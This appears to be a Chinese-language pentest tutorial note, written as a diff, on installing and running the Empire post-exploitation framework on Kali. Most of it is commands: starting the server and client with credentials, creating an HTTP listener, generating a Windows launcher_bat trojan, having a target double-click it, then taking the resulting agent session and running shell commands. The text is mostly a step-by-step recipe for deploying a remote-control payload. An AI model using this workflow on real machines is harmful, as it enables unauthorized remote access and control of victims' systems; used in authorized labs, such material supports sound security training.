@@ -1,0 +1,78 @@
+后渗透框架Empire：
+empire：基于powershell脚本的类似cs的后渗透框架(一般只能运行在linux下)，无需powershell.exe即可运行(猜测应该是empire底层实现了powershell)。
+
+
+empire项目地址：python3
+https://github.com/BC-SECURITY/Empire/
+https://www.bc-security.org/blog
+
+
+
+环境：
+kali、empire4.2
+最好使用docker的方式。
+此例自动安装了虚拟环境poetry(一个Python虚拟环境和依赖管理的工具)。
+
+
+linux之kali安装和配置empire：
+git clone https://github.com/BC-SECURITY/Empire.git
+./setup/install.sh
+
+
+empire和cs类似，分客户端和服务端。
+服务端启动：poetry run python empire.py server
+服务端的配置文件：Empire/empire/server/config.yaml
+可以编辑配置文件或指定参数：eg1：
+启动server端：
+poetry run python empire.py server  --username admiz6n  --password passwz6d --restport 2469  --socketport 50146
+若没指定，则使用默认值.
+
+
+
+客户端启动：poetry run python empire.py client
+服务端的配置文件：Empire/empire/client/config.yaml
+一般是通过编辑配置文件来指定连接的远程server等信息，如：
+other-server:
+    host: https://192.168.88.165
+    port: 2469
+    socketport: 50146
+    username: admiz6n
+    password: passwz6d
+    
+启动client端：
+poetry run python empire.py client
+默认是连接的localhost，故连接到指定server：
+(Empire) > connect -c other-server
+连接成功.
+
+
+
+
+使用http监听器：
+uselistener http
+set Port 6869
+set Name httz2p
+execute     //建立listener
+
+
+listeners   //查看listeners
+kill httpz9 //删除httpz9监听器
+
+
+常用命令：
+info、set、options、help
+
+
+
+
+生成launcher_bat木马：
+usestager windows/launcher_bat
+set Listener httz2p
+set OutFile sbxz.bat
+execute
+生成sbxz.bat文件.
+
+将sbxz.bat文件上传至靶机双击运行即可.
+agents命令查看sessions.
+interact CDYP28RS   //进入session
+shell whoami        //成功执行命令
